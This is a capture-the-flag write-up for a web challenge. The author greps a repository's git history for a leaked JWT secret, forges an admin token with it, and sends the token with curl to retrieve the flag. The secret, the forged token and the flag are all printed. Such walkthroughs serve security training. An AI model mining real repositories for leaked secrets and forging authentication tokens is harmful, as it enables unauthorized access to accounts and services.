---
title: FetchTheFlag CTF 2023-Web-RepoRecon
date: 2023-10-28 
categories: [Writeups, FetchTheFlag CTF 2023]
tags: [CTF,Web,Github,env,Repo,medium,JWT,git]
---

# Repo Recon - Medium
## Description
<sup>Author: @mowzer</sup><br>
  
Leak Leak Leak  
  
Can you find the secret leak?  
  
Psst... Snyk can help solve this challenge! [Try it out!](https://snyk.co/uf6Kk)  
  
**Press the `Start` button on the top-right to begin this challenge.**<br>
**Connect with:**<br>
	`http://challenge.ctf.games:30787`
## Solution
![[RepoRecon]](https://raw.githubusercontent.com/0xSirawit/Fetch-the-Flag-CTF-2023/main/assets/images/RepoRecon.png)
Click `Explore our Code` to see maybe source code of this page. It direct me to GitHub repository https://github.com/mowzk/repo-recon. 
after a while I understood all repo. The website want me a `JWT` toekn that sign with `JWT_SECRET`(get from `.env` file in commits history) and the website take token via the cookie name `auth_token`. Let's find it in history commits. There are **5,005** commits. The best way is using git to clone  this repository to local machine and use `git` command to show all commits content and grep `JWT_SECRET` strings.
```bash
$ git clone https://github.com/mowzk/repo-recon.git
$ cd repo-recon
$ git log --patch | grep JWT_SECRET
-JWT_SECRET=18b471a7d39b001bf79f12ab952f1364
+JWT_SECRET=18b471a7d39b001bf79f12ab952f1364
+const JWT_SECRET = process.env.JWT_SECRET;
+      const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
+        jwt.verify(token, JWT_SECRET);
```

**`JWT_SECRET=18b471a7d39b001bf79f12ab952f1364`**
Next, sign jwt cookie with the same command that the server use. `jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });`(in `server.js` line 25). I use https://replit.com/ to run javascript.
![[RepoRecon1]](https://raw.githubusercontent.com/0xSirawit/Fetch-the-Flag-CTF-2023/main/assets/images/RepoRecon1.png)
JWT token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk4NzQ4MzU0LCJleHAiOjE2OTg3NTE5NTR9.MorjJqG-LCtHsUOv4ceb8gSnQoHbINwHSUCRao9nVdM`. 
Let's request to `/flag`(found in `server.js`) with the JWT token to get the flag
```bash
$ curl -b "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk4NzQ4MzU0LCJleHAiOjE2OTg3NTE5NTR9.MorjJqG-LCtHsUOv4ceb8gSnQoHbINwHSUCRao9nVdM" http://challenge.ctf.games:30736/flag
{"success":true,"flag":"flag{8ee442003863b85514585c598a6a628b}"}
```

>Flag: flag{8ee442003863b85514585c598a6a628b}
{: .prompt-tip}